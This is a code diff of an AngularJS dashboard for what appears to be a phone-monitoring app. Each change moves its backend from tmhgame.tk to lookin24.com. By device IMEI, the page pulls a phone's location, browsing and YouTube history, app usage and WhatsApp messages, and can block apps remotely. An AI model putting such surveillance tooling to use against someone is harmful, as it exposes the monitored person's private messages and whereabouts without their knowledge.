@@ -267,7 +267,7 @@
                 console.log(b);
                 console.log("block status gonderildi " + block)
 
-                $http.get('https://tmhgame.tk/blockApp?imei='+$scope.d.imei+'&package='+b+'&block='+block).then(function (d) {
+                $http.get('https://lookin24.com/blockApp?imei='+$scope.d.imei+'&package='+b+'&block='+block).then(function (d) {
                     console.log(d.data.apps + " " + $scope.imei);
 
                     c.blocked = c.blocked ^ true;
@@ -283,7 +283,7 @@
 
                 console.log("Location Called");
 
-                $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&sendLocation=1').then(function (d) {
+                $http.get('https://lookin24.com/sendCommand?imei=356769106360753&sendLocation=1').then(function (d) {
                     console.log(d.data.locations);
                     //test data
                     d.data.locations = [
@@ -343,7 +343,7 @@
                                 },
                                 draggable:true,
                                 icon: {
-                                    url: 'https://tmhgame.tk/googlemapicon.png',
+                                    url: 'https://lookin24.com/googlemapicon.png',
                                     origin: new google.maps.Point(0, 0),
                                     labelOrigin: new google.maps.Point(20, -10)
                                 },
@@ -382,7 +382,7 @@
 
             $scope.Web = function() {
 
-                $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&sendWebsites=1').then(function (d) {
+                $http.get('https://lookin24.com/sendCommand?imei=356769106360753&sendWebsites=1').then(function (d) {
                     console.log(d.data.data);
                     if(d.data.data == undefined) {
                         return;
@@ -402,7 +402,7 @@
             $scope.whatsappf = function() {
 
 
-                $http.get('https://tmhgame.tk/Whatsapp?imei=356769106360753').then(function (d) {
+                $http.get('https://lookin24.com/Whatsapp?imei=356769106360753').then(function (d) {
                     console.log(d);
                     $scope.whatsaps = d.data.con;
                     //$scope.adapter.prepend($scope.whatsaps);
@@ -417,7 +417,7 @@
             }
             $scope.gundelik = function() {
 
-                $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753').then(function (d) {
+                $http.get('https://lookin24.com/sendCommand?imei=356769106360753').then(function (d) {
                     console.log(d.data.data);
 
                     $scope.gunluk = d.data.data;
@@ -460,7 +460,7 @@
 
             $scope.yact = function() {
 
-                $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&youtube=1').then(function (d) {
+                $http.get('https://lookin24.com/sendCommand?imei=356769106360753&youtube=1').then(function (d) {
                     console.log(d.data.data);
                     if(d.data.data == undefined) {
                         return;
@@ -487,7 +487,7 @@
             //$scope.Web();
 
             //$scope.aa=[];
-            $http.get('https://tmhgame.tk/getDevice?imei=356769106360753').then(function (d) {
+            $http.get('https://lookin24.com/getDevice?imei=356769106360753').then(function (d) {
                 console.log(d.data.apps);
                 if(d.data.apps == undefined) {
                     return;
@@ -662,7 +662,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in aa">
-            <td><img ng-src="https://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px;vertical-align: middle;"></td>
+            <td><img ng-src="https://lookin24.com/{{m.package}}.png" style="width: 60px; height: 60px;vertical-align: middle;"></td>
             <td style="word-break: break-word; padding: 0.25rem; vertical-align: middle">
                 <h5 >{{m.name}}</h5>
                 <h5>{{$index}}</h5>
@@ -686,7 +686,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in gunluk">
-            <td><img ng-src="https://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://lookin24.com/{{m.package}}.png" style="width: 60px; height: 60px"></td>
             <td style="word-break: break-word; padding: 0.25rem">
                 <h5 >{{m.name}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -709,7 +709,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in youtubes">
-            <td><img ng-src="https://tmhgame.tk/com.google.android.youtube.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://lookin24.com/com.google.android.youtube.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.name}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -733,7 +733,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in websites">
-            <td><img ng-src="https://tmhgame.tk/com.android.chrome.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://lookin24.com/com.android.chrome.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 style="display: block;width: 100px;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;">{{m.url}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -762,7 +762,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in whatsaps" ng-click="openc(m)">
-            <td><img ng-src="https://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://lookin24.com/com.whatsapp.png" style="width: 60px; height: 60px"></td>
             <td style="word-break: break-word">
                 <h5 >{{::m.sender}}
 
@@ -784,7 +784,7 @@
         </thead>
         <tbody>
         <tr class="item" ui-scroll="m in datasource" adapter="adapter" buffer-size="20" style="padding-top: 12px;" >
-<!--            <td><img ng-src="https://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>-->
+<!--            <td><img ng-src="https://lookin24.com/com.whatsapp.png" style="width: 60px; height: 60px"></td>-->
             <td style="word-break: break-word">
                 <h5 >{{m.sender}}</h5>
                 <p>{{m.content}}</p>
